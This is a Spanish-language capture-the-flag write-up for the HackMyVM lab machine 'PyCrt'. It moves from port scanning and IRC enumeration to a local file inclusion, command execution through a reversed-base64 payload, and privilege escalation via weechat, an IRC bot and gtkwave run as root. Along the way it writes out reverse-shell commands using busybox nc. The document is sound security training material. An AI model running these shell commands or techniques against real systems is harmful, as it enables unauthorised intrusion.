---
title: "PyCrt"
date: 2025-12-24
draft: false
description: "Writeup de la máquina PyCrt en HackMyVM."
categories: ["HackMyVM"]
tags:
  [
    "Business Logic",
    "Credential Exposure",
    "File Inclusion",
    "Misconfiguration",
    "Privilege Escalation",
    "Remote Code Execution",
  ]
image: "/writeups/hackmyvm/pycrt/media/cover.webp"
level: Medium
---

# Enumeración

Iniciemos identificando la máquina víctima con ayuda de **Arp-Scan** :

```bash
arp-scan -I ens33 --localnet --ignoredups
```

![img1](/writeups/hackmyvm/pycrt/media/01.webp)

Como podemos observar, la IP de la máquina víctima es `192.168.1.66`.

Vamos a realizar un escaneo para identificar primero los puertos abiertos con ayuda de **Nmap**:

```bash
nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.66 -oG allPorts
```

![img2](/writeups/hackmyvm/pycrt/media/02.webp)

Como podemos observar tenemos los puertos `22,80,6667`, con esto en mente vamos a realizar un segundo escaneo para obtener información de estos puertos en específico:

```bash
nmap -p22,80,6667 -sVC 192.168.1.66 -oN target
```

![img3](/writeups/hackmyvm/pycrt/media/03.webp)

Como podemos observar tenemos servicios `ssh, http y irc` corriendo, vamos a comenzar a enumerar el puerto `80` mirando su contenido:

![img4](/writeups/hackmyvm/pycrt/media/04.webp)

Podemos ver que tenemos en sí la página por defecto de apache2.

Vamos a revisar mediante la herramienta de `irssi` la conexión por el puerto `6667` a ver que logramos encontrar:

```bash
irssi
```

![img5](/writeups/hackmyvm/pycrt/media/05.webp)

![img6](/writeups/hackmyvm/pycrt/media/06.webp)

Vemos algo de información y algo que llama nuestra atención en el banner es que nombra al directorio `ShadowSec` por lo que vamos a intentar ver si esto existe en la web:

![img7](/writeups/hackmyvm/pycrt/media/07.webp)

Vemos la web, pero en realidad a más de esa información no tenemos nada, podemos intentar hacer un poco de fuzzing con **Gobuster** y buscar por archivos con extensión `.php`:

```bash
gobuster dir -u http://192.168.1.66/ShadowSec -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php
```

![img8](/writeups/hackmyvm/pycrt/media/08.webp)

Como podemos observar tenemos un archivo llamado `bydataset.php`, vemos que hace:

![img9](/writeups/hackmyvm/pycrt/media/09.webp)

no vemos nada interesante, pero vamos a intentar ver como se está tramitando la petición con BurpSuite:

![img10](/writeups/hackmyvm/pycrt/media/10.webp)

# Explotación

La verdad es que no vemos nada del otro mundo y no tenemos información, algo que podemos intentar talvez es buscar por parámetros en la url, vamos a intentarlo con ayuda de **Wfuzz**:

```bash
wfuzz -c --hw=4 -t 200 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt "http://192.168.1.66/ShadowSec/bydataset.php?FUZZ"
```

![img11](/writeups/hackmyvm/pycrt/media/11.webp)

podemos observar que es diferente al usar `file`, veamos en BurpSuite que es lo que sale:

![img12](/writeups/hackmyvm/pycrt/media/12.webp)

vemos que nos dice un error de lectura del archivo, esto me llama la atención y podemos intuir un **Local File Inclusion (LFI)**, vemos si es posible:

![img13](/writeups/hackmyvm/pycrt/media/13.webp)

perfecto, esto funciona, podemos intentar leer logs y más, pero no tenemos permisos, por lo que vamos a intentar leer el mismo archivo `bydataset.php` a ver si es posible:

![img14](/writeups/hackmyvm/pycrt/media/14.webp)

Excelente, vamos a analizar el código a ver que podemos hacer:

![img15](/writeups/hackmyvm/pycrt/media/15.webp)

Vemos que recibe también información por `POST`, con los parámetros `auth y payload`.

![img16](/writeups/hackmyvm/pycrt/media/16.webp)

Vemos que `auth=LetMeIn123!` y que luego se llama a una función `decrypt` y enviamos el payload.

Hasta este punto vamos a intentar con la información que tenemos para ver que obtenemos:

![img17](/writeups/hackmyvm/pycrt/media/17.webp)

Bueno, algo pasa con el payload, veamos que hace la función `decrypt`:
![img18](/writeups/hackmyvm/pycrt/media/18.webp)

Vemos que la función primero pone la cadena en reversa, luego hace decode de base64, entonces hasta allí yo lo que haría es mandar una cadena en base64 reversa, para lograr que al entrar en la función la ponga normal y luego haga el decode de base64, ahora el objetivo es entrar en el tercer apartado para que no retorne el `false` donde al parecer busca `cmd:` en la cadena para entrar, entonces vamos a hacer lo siguiente primero para probar:

```bash
echo "cmd:whoami" | base64 | rev
```

![img19](/writeups/hackmyvm/pycrt/media/19.webp)

ahora eso vamos a enviarlo en payload a ver que logramos:

![img20](/writeups/hackmyvm/pycrt/media/20.webp)

Vemos que se ejecuta el `whoami`, ya tenemos una forma de ejecutar comandos.

Ya con esto vamos a intentar entablar una Reverse Shell de la siguiente manera:

```bash
echo "cmd:busybox nc 192.168.1.68 443 -e /bin/sh" | base64 | rev
```

![img21](/writeups/hackmyvm/pycrt/media/21.webp)

ya con esto generamos la Reverse shell:

```bash
nc -nlvp 443
```

![img22](/writeups/hackmyvm/pycrt/media/22.webp)

![img23](/writeups/hackmyvm/pycrt/media/23.webp)

Listo ya tenemos la Reverse Shell, vamos a darle tratamiento y comenzamos a enumerar:

![img24](/writeups/hackmyvm/pycrt/media/24.webp)

# Escalada de Privilegios

Podemos observar como tenemos permiso para ejecutar como `chatlake` el binario de weechat, vamos a ver que podemos hacer ya dentro:

```bash
sudo -u chatlake /usr/bin/weechat
```

![img25](/writeups/hackmyvm/pycrt/media/25.webp)

algo que tenemos que saber es que mediante una conexión nosotros podemos ejecutar comandos con `/exec <comando>`, quedando de la siguiente manera:

![img26](/writeups/hackmyvm/pycrt/media/26.webp)

perfecto, lo que voy a hacer es generar otra reverse shell para poder quedar como el usuario `chatlake` ejecutando `/exec busybox nc 192.168.1.68 444 -e /bin/sh`:

![img27](/writeups/hackmyvm/pycrt/media/27.webp)

Listo, volvemos a intentar dar un tratamiento y luego comenzamos a enumerar.

En este usuario encontramos la flag de usuario.

![img28](/writeups/hackmyvm/pycrt/media/28.webp)

![img29](/writeups/hackmyvm/pycrt/media/29.webp)

Como observamos podemos iniciar un servicio sin necesidad de introducir contraseña, podemos hacerlo para ver que logramos.

![img30](/writeups/hackmyvm/pycrt/media/30.webp)

Listo ahora el revisar, enumerar y buscar donde o que podemos aprovechar en este servicio es una opción, pero la verdad no encontré nada, con eso en mente lo que hice es volver a conectarme al IRC, para ver si algo cambio:

![img31](/writeups/hackmyvm/pycrt/media/31.webp)

a comparación de la primera vez ahora tenemos 6 canales disponibles, en este caso nos conectamos a todos y enviamos mensajes esperando respuestas o algo:

![img32](/writeups/hackmyvm/pycrt/media/32.webp)

podemos observar que llega un mensaje que nos dice que al final de los mensajes mandemos un `:)`, vamos a intentarlo en los diferentes chats a ver que logramos:

![img33](/writeups/hackmyvm/pycrt/media/33.webp)

se genera una nueva conversación donde vemos lo siguiente:

![img34](/writeups/hackmyvm/pycrt/media/34.webp)

veamos con números:

![img35](/writeups/hackmyvm/pycrt/media/35.webp)

![img36](/writeups/hackmyvm/pycrt/media/36.webp)

vemos lo mismo, podemos intentar enviar mensajes en los diferentes chats a ver si en alguno el mensaje cambia:

![img37](/writeups/hackmyvm/pycrt/media/37.webp)

![img38](/writeups/hackmyvm/pycrt/media/38.webp)

Vemos que en el canal 2 cambia el mensaje y vemos que dice que la ejecución del comando no se permitió.

Si recordamos, teníamos una web con información donde tenemos `operative: ll104567`, podemos intentar cambiar el nick a ese valor para ver que logramos, para esto hacemos un `/nick ll104567`:

![img39](/writeups/hackmyvm/pycrt/media/39.webp)

perfecto ahora volvemos a intentar con el mensaje del numero a ver que sucede:

![img40](/writeups/hackmyvm/pycrt/media/40.webp)

vemos lo mismo, intentamos con las demás salas a ver si alguna cambia:

![img41](/writeups/hackmyvm/pycrt/media/41.webp)

Podemos observar que al enviarlo desde el `chan1` logramos ver una `A`, esto es algo extraño, pero y si intentamos enviar letras en formato ascii:

![img42](/writeups/hackmyvm/pycrt/media/42.webp)

intentemos con la `d` en format decimal que sería el `100`:

![img43](/writeups/hackmyvm/pycrt/media/43.webp)

Esto funciona, enviemos combinaciones simples como `id` a ver si se ejecuta `105 100:)`:

![img44](/writeups/hackmyvm/pycrt/media/44.webp)

vemos que sigue sin ser autorizado, pero vamos a intentar con diferentes comandos y para automatizar el proceso de pasar los valores a decimal se utilizara el siguiente script:

```python
import sys
def main():
    command=sys.argv[1]
    command_decimal = ''
    for char in command:
        command_decimal += str(ord(char)) + " "
    print(f"comand: {command_decimal}:)")
if __name__ == '__main__':
    main()
```

![img45](/writeups/hackmyvm/pycrt/media/45.webp)

![img46](/writeups/hackmyvm/pycrt/media/46.webp)

listo con esto ya podemos volver a generar una Reverse Shell para estar como el usuario `pycrtlake`:

![img47](/writeups/hackmyvm/pycrt/media/47.webp)
![img48](/writeups/hackmyvm/pycrt/media/48.webp)

Listo, ahora le damos tratamiento y comenzamos a enumerar.

![img49](/writeups/hackmyvm/pycrt/media/49.webp)

Vemos que podemos ejecutar `gtkwave` como root.

Nosotros mediante `gtkwave` podemos inicializar una consola interactiva TCL, el problema es que para esto necesitamos GUI pero al no tenerla esto fallara.

Vamos a emular un `Display` con ayuda de `Xvfb` de la siguiente manera:

```bash
Xvfb :1 &
```

![img50](/writeups/hackmyvm/pycrt/media/50.webp)

Ya con esto usaremos `gtkwave` donde con el parámetro `-W` e indicando el `Display` a usar que será el `1` vamos a ejecutarlo de la siguiente manera:

```bash
sudo DISPLAY=:1 /usr/bin/gtkwave -W
```

![img51](/writeups/hackmyvm/pycrt/media/51.webp)

Tenemos la consola interactiva como `root`.

Ya podemos ver la flag:

![img52](/writeups/hackmyvm/pycrt/media/52.webp)

Lab Terminado.
![img53](/writeups/hackmyvm/pycrt/media/53.webp)
